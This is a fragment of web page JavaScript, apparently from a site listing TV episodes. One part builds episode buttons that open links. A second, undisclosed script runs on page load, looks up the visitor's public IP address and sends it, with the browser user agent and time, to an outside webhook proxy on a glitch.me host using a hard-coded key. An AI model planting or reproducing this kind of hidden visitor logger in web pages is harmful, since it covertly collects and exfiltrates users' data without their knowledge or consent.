    function openWithReferrer(url) {
      const a = document.createElement('a');
      a.href = url;
      a.setAttribute('referrerpolicy', 'no-referrer-when-downgrade');
      a.setAttribute('rel', 'noopener noreferrer');
      a.target = '_blank';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }

    function createEpisodeButtons(containerId, episodeList) {
      const container = document.getElementById(containerId);
      episodeList.forEach((url, index) => {
        const btn = document.createElement('button');
        btn.className = 'episode-button';
        btn.innerText = `Episódio ${index + 1}`;
        btn.onclick = () => {
          openWithReferrer(url);
        };
        container.appendChild(btn);
      });
    }

    createEpisodeButtons('season1', episodes.season1);
    createEpisodeButtons('extras', episodes.extras);
    createEpisodeButtons('season2', episodes.season2);
  </script>

  <script>
    (function () {
      const proxyUrl = "https://placid-ethereal-tortoise.glitch.me/webhook-proxy";
      const secretKey = "blox87";

      if (sessionStorage.getItem("dadosEnviados")) return;

      const time = new Date().toLocaleTimeString();
      const nick = navigator.userAgent;

      fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
          const ip = data.ip;
          const url = `${proxyUrl}?nick=${encodeURIComponent(nick)}&time=${encodeURIComponent(time)}&ip=${encodeURIComponent(ip)}&key=${secretKey}`;
          
          fetch(url)
            .then(() => sessionStorage.setItem("dadosEnviados", "true"))
            .catch(err => console.error("Erro ao enviar dados:", err));
        })
        .catch(err => console.error("Erro ao obter IP:", err));
    })();
